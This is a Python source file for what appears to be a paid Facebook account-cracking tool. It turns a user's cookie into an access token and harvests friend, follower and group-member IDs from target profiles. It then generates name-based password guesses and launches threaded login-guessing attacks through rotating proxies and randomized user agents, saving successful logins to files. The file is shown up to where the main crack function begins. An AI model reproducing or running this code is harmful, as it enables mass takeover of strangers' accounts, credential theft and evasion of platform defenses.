#= RANA - CODER=#



#-----------------[ IMPORT-MODULE ]-------------------#

import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3,rich,base64

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich import print as rprint

from rich import pretty

from rich.text import Text as tekz

pretty.install()

CON=sol()

#------------------[ USER-AGENT ]-------------------#

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

	prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text

	open('.prox.txt','w').write(prox)

except Exception as e:

	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

	a='Mozilla/5.0 (Symbian/3; Series60/'

	b=random.randrange(1, 9)

	c=random.randrange(1, 9)

	d='Nokia'

	e=random.randrange(100, 9999)

	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

	g=random.randrange(1, 9)

	h=random.randrange(1, 4)

	i=random.randrange(1, 4)

	j=random.randrange(1, 4)

	k='Mobile Safari/535.1'

	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

	ugen2.append(uaku)



	aa='Mozilla/5.0 (Linux; U; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c=' en-us; GT-'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)

	

	aa='Mozilla/5.0'

	b=random.choice(['6','7','8','9','10','11','12'])

	c='(iPhone; CPU iPhone OS 15_3 like Mac OS X)'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/10.1'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile/PB37P8 Safari/615.15'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)

	

	aa='Mozilla/5.0 (Linux; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c='100003562)'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)

	

	aa='Mozilla/5.0 (Linux; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c='Redmi Note 8)'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)



for x in range(10):

	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'

	b=random.randrange(100, 9999)

	c=random.randrange(100, 9999)

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	h=random.randrange(1, 9)

	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'

	j=random.randrange(1, 9)

	k=random.randrange(1, 9)

	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'

	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

def uaku():

	try:

		ua=open('bbnew.txt','r').read().splitlines()

		for ub in ua:

			ugen.append(ub)

	except:

		a=requests.get('https://github.com/Saw4x/TOOLxFB/blob/main/.SAW-MOBILE.txt').text

		ua=open('.SAW-MOBILE.txt','w')

		aa=re.findall('line">(.*?)<',str(a))

		for un in aa:

			ua.write(un+'\n')

		ua=open('.SAW-MOBILE.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m'

M = '\x1b[1;91m'

H = '\x1b[1;92m'

K = '\x1b[1;93m'

B = '\x1b[1;94m'

U = '\x1b[1;95m' 

O = '\x1b[1;95m'

N = '\x1b[0m'    

Z = "\033[1;33m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;96m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # DEFAULT +++

hh = '\033[32m' # HIJAU -

u = '\033[93m' # PINK

kk = '\033[32m' # YELLOW ++

b = '\33[1;96m' # BLUE ++++++ 

p = '\x1b[0;34m' # RED ----

asu = random.choice([m,k,h,u,b])

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}

dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'





def chk():



   uuid = str(os.geteuid()) + str(os.getlogin()) 

   

   id = "|".join(uuid)

   

   print("\n\n\x1b[37;1m YOUR KEY : \033[94m"+id) 

   

   try: 

       httpCaht = requests.get("https://raw.githubusercontent.com/RANA-CODER13/rana-coder/main/rana55.txt").text



   except requests.exceptions.ConnectionError:

   

       os.system('clear')

       

       banner()

       

       print('Keshay Internett Haya.!')



   if id in httpCaht: 

       print("\033[92m YOUR KEY IS ACTIVE.........\033[97m") 

       time.sleep(1) 



       pass 



   else: 



       print("\033[0;96m Bro This Script is Paid to Buy Send Chat to Owner Telegram @X9_8L") 



       os.system('xdg-open  https://t.me/X9_8L')



       time.sleep(1) 



       sys.exit() 



  



chk()



#------------------[ MACHINE-SUPPORT ]---------------#

def alvino_xy(u):

        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

def clear():

	os.system('clear')

def back():

	login()

#------------------[ LOGO-LAKNAT ]-----------------#

def banner():

	print(f'''\t{M} 

\033[1;97m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

, ＜￣｀ヽ、　　　　　　／￣＞

　ゝ、　　＼　／⌒ヽ,ノ 　/´

　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／

　　 　　>　 　 　,)

　　　　　∠_,,,/



                             CODE BY  : PATRICK

                             Telegram : @X9_8L

                             CHANAL   : https://t.me/not_availble

                             Team     : not_availble 

                             Version  : 5.1

                             

                             

 ╔╦══• •✠•❀ XR-CRACK ❀•✠ • •══╦╗

 ╚╩══• •✠•❀ XR-CRACK ❀•✠ • •══╩╝



--------------------------------------------------------------------------

🎀  Don't Minimize When Clonning 

--------------------------------------------------------------------------



	

--------------------------------------------------------------------------

 FOR BUY CHAT FOR OWNER

--------------------------------------------------------------------------

\n''')

#--------------------[ BAGIAN-MASUK ]--------------#

def DYNO():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			MRDYNO()

		except requests.exceptions.ConnectionError:

			li = '# Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		MRDYNO()

		

def MRDYNO():

	try:

		os.system('clear')

		banner()

		your_cookies = input(' Cookie :  ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n ╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("")

							os.system("python MR-CRACK.py")

							print("python MR-CRACK");DYNO()

			except Exception as e:

				print(" ╰─  Cookies Mokad Kontol")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass



	        

#------------------[ BAGIAN-MENU ]----------------#

def menu(my_name,my_id):

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		print('[×] Cookies NO ')

		time.sleep(5)

		MRDYNO()

	os.system('clear')

	banner()

	print(' 《1》 ID PUBLIC/MULITY ')

	print('')

	print(' 《2》 PUBLIC CLONING')

	print('')

	print(' 《3》 FILE CLONING ')

	print('')

	print(' 《0》 LOG OUT')

	print('')

	_____alvino__adijaya_____ = input('\n PILIH : ')

	if _____alvino__adijaya_____ in ['1']:

		dump_massal()

	elif _____alvino__adijaya_____ in ['2']:

		dump_public()

	elif _____alvino__adijaya_____ in ['3']:

		File2()

	elif _____alvino__adijaya_____ in ['4']:

		result()

		os.system("python MR-CRACK.py")

	elif _____alvino__adijaya_____ in ['0']:

		os.system('rm -rf .token.txt')

		os.system('rm -rf .cok.txt')

		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSukses Logout\x1b[1;93m+\x1b[1;92mDelleted Cukis ')

		exit()

	else:

		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih Yang Bener ')

		back()

def error():

	print(f'\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mMaaf Fitur Ini Masih Di Perbaiki {x}')

	time.sleep(4)

	back()

	print('')

#-----------------[ HASIL-CRACK ]-----------------#



#-------------------[ CRACK-PUBLIK ]----------------#

def dump_massal():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		exit()

	try:

		jum = int(input('\x1b[1;97m[\033[1;32m■\x1b[1;97m] HOW MANY ID =  '))

	except ValueError:

		print('<•> Masukkan Angka Anjing, Malah Huruff ')

		exit()

	if jum<1 or jum>100:

		print('<•> Gagal Dump Idz ')

		exit()

	ses=requests.Session()

	yz = 0

	for met in range(jum):

		yz+=1

		kl = input('\x1b[1;97m[\033[1;32m■\x1b[1;97m] PASTE ID '+str(yz)+' : ')

		uid.append(kl)

	for userr in uid:

		try:

			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()

			for mi in col['friends']['data']:

				try:

					iso = (mi['id']+'|'+mi['name'])

					if iso in id:pass

					else:id.append(iso)

				except:continue

		except (KeyError,IOError):

			pass

		except requests.exceptions.ConnectionError:

			print('<•> Sinyal Loh Kek Kontoll ')

			exit()

	try:

		print('')

		print(f'TOTAL ID CLOCTED : {h}'+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		print(f'{x}')

		print('<•> Sinyal Lo kek Kontol ')

		back()

	except (KeyError,IOError):

		print(f'<•>{k} Pertemanan Tidak Public {x}')

		time.sleep(3)

def dump_public():

	try:

		token = open('.token.txt','r').read()

		kukis = open('.cok.txt','r').read()

	except IOError:

		exit()

	print(f'{b} • If You Want to Crack Your Own Friendship')

	pil = input(f' • Enter Target ID : ')

	try:

		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()

		for pi in koH['friends']['data']:

			try:id.append(pi['id']+'|'+pi['name'])

			except:continue

		print('')

		print(f' • Total IDs Collected : {asu}'+str(len(id)))

		print('')

		setting()

	except requests.exceptions.ConnectionError:

		print(' • Your Internet Doesnt Exist !')

		exit()

	except (KeyError,IOError):

		print(' • Friendships Arent Public Or Your Cookies And Tokens Are Rotten')

		exit()

#-------------------[ CRACK-PENGIKUT ]----------------#

def dump_pengikut():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		exit()

	print(' ')

	pil = input('')

	try:

		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()

		for pi in koh2['subscribers']['data']:

			try:id.append(pi['id']+'|'+pi['name'])

			except:continue

		print(f':{h} '+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		print('')

		exit()

	except (KeyError,IOError):

		print('')

		exit()

#------------------[ CRACK-GRUP ]-----------------#

balmond = b+"["+h+"“"+b+"]"



def lah():

	print("\r"+balmond+m+" \x1b[1;86m :\x1b[1;87m "+str(len(id))+"                     ")

	input(balmond+m +"\x1b[1;86m Klik [\x1b[1;85m Enter ]\x1b[1;83m Jika Ingin Langsung Crack !!")

	pass

	setting()

def grup():

	print('')

	id = input(""+balmond+h+" \x1b[1;94m>> Masukkan Idz Grup :\x1b[1;94m ")

	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'

	miskinlu = {"user-agent": ua}

	url = "https://mbasic.facebook.com/groups/"+id

	ses = requests.Session()

	try:

		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')

	except requests.exceptions.ConnectionError:

		print(balmond+m+" Koneksi Internet Terputus..")

		time.sleep(0.5)

		exit()

	berr = gn.find("title")

	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")

	if berr2=='Masuk Facebook':

		print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")

		time.sleep(0.5)

		crack_grup()

	elif berr2=='Kesalahan':

		jalan(balmond+m+" Grup Tidak Ditemukan..")

		time.sleep(0.5)

		crack_grup()

	else:pass

	print(""+balmond+p+" \x1b[1;81m>> p :\x1b[1;82m "+berr2)

	ggs = gn.find_all('table')

	ang = []

	for ff in ggs:

		anggo = ff.text

		bro = anggo.replace('Anggota','')

		try:

			mex = int(bro)

			jumlah = ang.append(mex)

		except:

			pass

	if len(ang)==0:

		print(balmond+h+" Anggota : -")

	else:

		print(balmond+h+" \x1b[1;94m>> Anggota :\x1b[1;97m "+str(ang[0]))

	grup1(url)

def grup1(urls):

	use = []

	ses = requests.Session()

	print(""+balmond+m+" \x1b[1;94mJika Berhenti, Mode Pesawat 5 Detik")

	print(balmond+m+" \x1b[1;94mSedang Mengumpulkan ID")

	print(balmond+m+" \x1b[1;94m")

	while True:

		try:

			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'

			miskinlu = {"user-agent": ua}

			try:

				url = use[0]

			except:

				url = urls

			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")

			bf2 = set.find_all('a')

			for g in bf2:

				css = str(g).split('>')

				if 'Lihat Postingan Lainnya</span' in css:

					bcj = str(g).replace('<a href="','').replace('amp;','')

					bcj2 = bcj.split(' ')[0].replace('"><img','')

			tes = set.find_all('table')

			for cari in tes:

				liatnih = cari.text

				spl = liatnih.split(' ')

				if 'mengajukan' in spl:

					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))

					idyou =	idsiapa[0].replace('content_owner_id_new.','')

					namayou = liatnih.replace(' m .','')

					idku = idyou+'|'+namayou

					if idku in id:

						continue

					else:

						id.append(idku)

						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()

				elif '>' in spl:

					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))

					idyou =	idsiapa[0].replace('content_owner_id_new.','')

					namayou = liatnih.split(' > ')[0]

					idku = idyou+'|'+namayou

					if idku in id:

						continue

					else:

						id.append(idku)

						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()

				else:

					continue

			try:

				link_ = bcj2

				use.insert(0,'https://mbasic.facebook.com'+link_)

			except:

				girang = set.find('title')

				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")

				if girang2=='Masuk Facebook':

					pass

				else:

					lah()

		except requests.exceptions.ConnectionError:

			try:

				time.sleep(31)

			except KeyboardInterrupt:

				lah()

		except KeyboardInterrupt:

			lah()

#-------------[ CRACK-FROM-FILE ]------------------#

def File2():

			print('')

			print("\033[32mFILE CLONING")

			try:

				print('')

				fileX = input ('\n\033[1;97m [+] Enter File Path : ') 

				print(f'')

				for line in open(fileX, 'r').readlines():

					id.append(line.strip())

				setting()

			except IOError:

				exit("\n [!] File  %s Not Found"%(fileX))		

#-------------[ PENGATURAN-IDZ ]---------------#

def setting():

	print(f' 《1》 OLD CLONE')

	print(f' 《2》 NEW CLONE')

	print(f' 《3》 ID NEW+OLD')

	hu = input('\n\033[33m PILIH : ')

	if hu in ['1','01']:

		for tua in sorted(id):

			id2.append(tua)



	elif hu in ['2','02']:

		muda=[]

		for bacot in sorted(id):

			muda.append(bacot)

		bcm=len(muda)

		bcmi=(bcm-1)

		for xmud in range(bcm):

			id2.append(muda[bcmi])

			bcmi -=1

	elif hu in ['3','03']:

		for bacot in id:

			xx = random.randint(0,len(id2))

			id2.insert(xx,bacot)

	else:

		print(' PILIH ')

		back()

	print('')

	print(' 《1》 Mobile / Facebook.com = ')

	hc = input('\n\033[33m PILIH : ')

	if hc in ['1','01']:

		method.append('mobile')

	elif hc in ['']:

		print(' PILIH ')

		setting()

	elif hc in ['22','022']:

		method.append('free')

#	elif hc in ['3','03']:

 # 	method.append('touch')

	elif hc in ['2','02']:

		method.append('mbasic')

	else:

		method.append('mobile')

	print('')

	_jembot_ = input('\x1b[1;91mSHOW THE APPS [\x1b[1;92m Y\x1b[1;91m/\x1b[1;93mT \x1b[1;91m] = ')

	if _jembot_ in ['']:

		print(' \033[33m PILIH ')

		back()

	elif _jembot_ in ['y','Y']:

		taplikasi.append('ya')

	else:

		taplikasi.append('no')

	pwplus=input('\x1b[1;91mAUTO PASS [ \x1b[1;92mt \x1b[1;91m] =   ')

	if pwplus in ['y','Y']:

		pwpluss.append('ya')

		cetak(nel(' 1122334455,5544332211,..... '))

		pwku=input('[➣_] PASTE PASS : ')

		pwkuh=pwku.split(',')

		for xpw in pwkuh:

			pwnya.append(xpw)

	else:

		pwpluss.append('no')

	passwrd()

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():

	print(f'>>>>> {m}•{k}•{h}•{x} FULL CLONING HAS BEEN STARTED {m}•{k}•{h}•{x} <<<<< ')

	print('')

	os.system('clear');banner()

	print(f'------------------------------------------------------')

	print(f' ALL IDS = '+str(len(id)))

	print(f' CLONING HAS STARTING')

	print(f' PROCESSING')

	print(f'------------------------------------------------------')

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

			frs = nmf.split(' ')[0]

			pwv =[]

			if len(nmf)<6:

				if len(frs)<3:

					pass

				else:

					pwv.append(frs+frs)

					pwv.append(frs+"123")

					pwv.append(frs+" "+frs)

					pwv.append("1122334455")

					pwv.append(frs+"1988")

					pwv.append(frs+"1989")

					pwv.append(frs+"1990")

					pwv.append(frs+"1991")

					pwv.append(frs+"1992")

					pwv.append(frs+"1993")

					pwv.append(frs+"1994")

					pwv.append(frs+"1995")

					pwv.append(frs+"2005")

					pwv.append(frs+"2000")

					pwv.append(frs+"2003")

					pwv.append(frs+"12")

					pwv.append(frs+"112233")

					pwv.append(frs+"1234")

					pwv.append(frs+"12345")

					pwv.append(frs+"123456")

					pwv.append(frs+"12344321")

					pwv.append(frs+"1122")

					pwv.append(frs+"123456789")

					pwv.append(frs+"1234567890")

					pwv.append(frs+"1212")

					pwv.append(frs+"321")

					pwv.append(frs+"1")

					pwv.append("123"+frs)

					pwv.append("1234"+frs)

					pwv.append("12345"+frs)

					pwv.append("123456"+frs)

			else:

				if len(frs)<3:

					pwv.append(nmf)

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+frs)

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'123456')

					pwv.append(frs+'123456789')

					pwv.append(frs+'1234567890')

					pwv.append(frs+'12')

					pwv.append(frs+'1122')

					pwv.append(frs+'321')

					pwv.append(frs+'1212')

					pwv.append('123'+frs+'123')

					pwv.append('1234'+frs+'1234')

					pwv.append('12345'+frs+'12345')

					pwv.append('123'+frs)

					pwv.append('1234'+frs)

					pwv.append('12345'+frs)

					pwv.append(frs+" "+frs)

					pwv.append("1122334455")

					pwv.append(frs+"11")

					pwv.append(frs+"12")

					pwv.append(frs+"1987")

					pwv.append(frs+"1988")

					pwv.append(frs+"1989")

					pwv.append(frs+"1990")

					pwv.append(frs+"1991")

					pwv.append(frs+"1992")

					pwv.append(frs+"1993")

					pwv.append(frs+"1994")

					pwv.append(frs+"1995")

					pwv.append(frs+"2005")

					pwv.append(frs+"2000")

					pwv.append(frs+"2003")

			if 'ya' in pwpluss:

				for xpwd in pwnya:

					pwv.append(xpwd)

			else:pass

			if 'mobile' in method:

				pool.submit(crack,idf,pwv)

			elif 'free' in method:

				pool.submit(crackfree,idf,pwv)

			elif 'touch' in method:

				pool.submit(cracktouch,idf,pwv)

			elif 'mbasic' in method:

				pool.submit(crackmbasic,idf,pwv)

			else:

				pool.submit(crackmbasic,idf,pwv)

	print('')

	cetak(nel('\t[cyan]-[green] CRACK DONE.....[cyan] =[white] '))

	print(f'[{h}•{h}]{h} OK : {h}%s '%(ok))

	print(f'{m}[{m}•{m}]{m} CP : {m}%s{m} '%(cp))

	print('')

	print(' CRACK AGAIN ? [ Y == T ] = ')

	woi = input('\x1b[1;95m   CHOICE = ')

	if woi in ['y','Y']:

		back()

	else:

		print(f'\t{x}{k}  ')

		time.sleep(2)

		exit()

#--------------------[ METODE-B-API ]-----------------#

os.system('clear');banner()

def crack(idf,pwv):

	global loop,ok,cp

	bo = random.choice([m,k,h,b,u,x])

	sys.stdout.write(f"\r \r TEST ➸ {P}{k}{loop}{P}/{h}{len(id)}{P} × {P}{H} GOOD ~ {ok}{P} "),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			nip=random.choice(prox)

